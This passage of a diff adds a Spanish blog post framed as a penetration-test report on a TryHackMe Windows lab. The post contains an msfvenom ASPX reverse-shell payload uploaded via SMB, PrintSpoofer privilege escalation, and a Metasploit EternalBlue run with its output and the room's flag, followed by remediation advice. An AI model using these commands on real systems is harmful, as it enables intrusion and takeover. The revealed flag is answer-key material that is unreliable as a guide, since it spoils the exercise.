+</span></span><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o shell.aspx LHOST<span style="color:#f92672">=</span>tun0 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Accedo y subo payload</span>
+</span></span><span style="display:flex;"><span>smbclient <span style="color:#ae81ff">\\\\</span>&lt;TARGET_IP&gt;<span style="color:#ae81ff">\n</span>t4wrksv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>put shell.aspx
+</span></span></code></pre></div><h3 id="vulnerabilidad-4">Vulnerabilidad 4</h3>
+<p><strong>Descripción:</strong> Se identificó que el sistema permite el abuso del privilegio &ldquo;SeImpersonate&rdquo;, lo que podría utilizarse para ejecutar comandos con privilegios de SYSTEM.</p>
+<p><strong>Gravedad:</strong> Alta</p>
+<p><strong>Evidencia:</strong> La información sobre el abuso de &ldquo;SeImpersonate&rdquo; se encontró durante la evaluación de privilegios utilizando el comando &ldquo;whoami /priv&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Se compila payload, se sube y se ejecuta para obtener acceso privilegiado</span>
+</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\P</span>rintSpoofer.exe -i -c cmd
+</span></span></code></pre></div><h3 id="vulnerabilidad-5">Vulnerabilidad 5</h3>
+<p><strong>Descripción:</strong> Se encontró una bandera en el archivo &ldquo;user.txt&rdquo; en el directorio del usuario Bob.</p>
+<p><strong>Gravedad:</strong> Baja</p>
+<p><strong>Evidencia:</strong> La bandera se encontró en el archivo &ldquo;user.txt&rdquo; en el directorio del usuario Bob.</p>
+<h3 id="vulnerabilidad-6">Vulnerabilidad 6</h3>
+<p><strong>Descripción:</strong> Se explotó con éxito la vulnerabilidad EternalBlue (MS17-010) en el sistema objetivo, lo que permitió obtener acceso privilegiado al sistema como administrador.</p>
+<p><strong>Gravedad:</strong> Crítica</p>
+<p><strong>Evidencia:</strong> Se utilizó Metasploit para explotar la vulnerabilidad y se obtuvo acceso a la sesión de Meterpreter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set SMBUSER Bob
+</span></span><span style="display:flex;"><span>SMBUSER <span style="color:#f92672">=</span>&gt; Bob
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set SMBPASS !P@$$W0rD!123
+</span></span><span style="display:flex;"><span>SMBPASS <span style="color:#f92672">=</span>&gt; !P@$$W0rD!123
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.x.x.x.x:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445      - Host is likely VULNERABLE to MS17-010! - Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445      - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445 - The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Connecting to target <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445 - Connection established <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445 - Target OS selected valid <span style="color:#66d9ef">for</span> OS indicated by SMB reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - CORE raw buffer dump <span style="color:#f92672">(</span><span style="color:#ae81ff">45</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - 0x00000000  <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">69</span> 6e <span style="color:#ae81ff">64</span> 6f <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">32</span>  Windows Server <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - 0x00000010  <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">61</span> 6e <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">016</span> Standard Eva
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - 0x00000020  6c <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">69</span> 6f 6e <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">33</span>           luation <span style="color:#ae81ff">14393</span>   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445 - Target arch selected valid <span style="color:#66d9ef">for</span> arch indicated by DCE/RPC reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Trying exploit with <span style="color:#ae81ff">12</span> Groom Allocations.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Sending all but last fragment of exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Starting non-paged pool grooming
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445 - Sending SMBv2 buffers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.99.195:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Sending final SMBv2 buffers.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.99.195:445 - Sending last fragment of exploit packet!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cd Desktop<span style="color:#ae81ff">\\</span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=======================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2020-07-25 16:58:09 +0200  desktop.ini
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">35</span>    fil   2020-07-25 17:25:02 +0200  root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat root.txt 
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>1fk5kf469devly1gl320zafgl345pv<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><h2 id="sugerencias-de-remediación">Sugerencias de Remediación</h2>
+<h3 id="vulnerabilidad-2-1">Vulnerabilidad 2</h3>
+<p><strong>Mitigación:</strong></p>
+<ol>
+<li>Revisar y corregir la configuración del servidor web para eliminar las rutas que devuelven códigos de respuesta 400.</li>
+<li>Implementar listas de control de acceso (ACL) para limitar el acceso a recursos no deseados.</li>
+<li>Utilizar un firewall de aplicaciones web (WAF) para detectar y bloquear solicitudes maliciosas.</li>
+</ol>
+<h3 id="vulnerabilidad-3-1">Vulnerabilidad 3</h3>
+<p><strong>Mitigación:</strong></p>
+<ol>
+<li>Reforzar la seguridad del servidor SMB restringiendo el acceso a los recursos compartidos solo a usuarios autorizados.</li>
+<li>Aplicar control de acceso basado en roles (RBAC) para limitar quién puede cargar y ejecutar archivos en los recursos compartidos.</li>
+<li>Monitorizar y auditar el acceso a los recursos compartidos para detectar actividades sospechosas.</li>
+</ol>
+<h3 id="vulnerabilidad-4-1">Vulnerabilidad 4</h3>
+<p><strong>Mitigación:</strong></p>
+<ol>
+<li>Evaluar y limitar los privilegios asignados a los usuarios y grupos en el sistema.</li>
+<li>Utilizar políticas de seguridad para restringir el uso de privilegios sensibles como &ldquo;SeImpersonate&rdquo; a usuarios y aplicaciones específicos.</li>
+<li>Implementar políticas de seguridad y auditoría para registrar y supervisar el uso de privilegios sensibles.</li>
+</ol>
+<h3 id="vulnerabilidad-6-1">Vulnerabilidad 6</h3>
+<p><strong>Mitigación:</strong></p>
+<ol>
+<li>Aplicar los parches de seguridad disponibles para cerrar la vulnerabilidad MS17-010.</li>
+<li>Utilizar un sistema de detección de intrusiones (IDS) o prevención de intrusiones (IPS) para detectar y bloquear intentos de explotación de esta vulnerabilidad.</li>
+<li>Segmentar la red para limitar la propagación de malware en caso de una explotación exitosa.</li>
+</ol>
+<h2 id="conclusiones">Conclusiones</h2>
+<p>En esta prueba de penetración se identificaron múltiples vulnerabilidades, incluyendo la explotación exitosa de la vulnerabilidad EternalBlue (MS17-010) para obtener acceso privilegiado. Estos hallazgos destacan la importancia de mantener sistemas actualizados y configurados de manera segura.</p>
+<h2 id="recomendaciones-finales">Recomendaciones Finales</h2>
+<p>Se recomienda lo siguiente para mejorar la seguridad del sistema:</p>
+<ol>
+<li>Aplicar los parches y actualizaciones de seguridad necesarios para cerrar las vulnerabilidades conocidas, incluyendo MS17-010.</li>
+<li>Utilizar un sistema de detección de intrusiones (IDS) o prevención de intrusiones (IPS) para detectar y bloquear intentos de explotación de vulnerabilidades.</li>
+<li>Segmentar la red para limitar la propagación de malware en caso de una explotación exitosa.</li>
+<li>Realizar evaluaciones de seguridad periódicas y pruebas de penetración para identificar y remediar posibles riesgos.</li>
+<li>Seguir las mejores prácticas de seguridad de la industria, como la configuración segura de servicios y la gestión adecuada de privilegios.</li>
+</ol>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/eternalblue">#EternalBlue</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/gobuster">#GoBuster</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/medium">#Medium</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/ms17-010">#MS17-010</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/printspoofer">#PrintSpoofer</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/report">#Report</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/simulation">#Simulation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#Windows</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
